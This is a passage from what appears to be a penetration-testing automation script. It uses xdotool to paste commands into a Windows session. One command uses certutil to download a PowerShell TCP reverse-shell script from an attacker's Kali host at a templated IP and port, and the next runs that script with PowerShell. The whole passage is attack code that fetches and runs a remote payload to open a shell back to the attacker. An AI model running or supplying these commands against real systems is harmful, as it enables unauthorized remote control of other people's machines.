...
paste_command "certutil.exe -urlcache -split -f http://${KALI_IP}:${HTTP_PORT}/PowerShellTcp-shell.ps1 ${TMP_FOLDER}\PowerShellTcp-shell.ps1"
xdotool key Return
sleep 3

paste_command "powershell -c '${TMP_FOLDER}\PowerShellTcp-shell.ps1'"
xdotool key Return
sleep 10
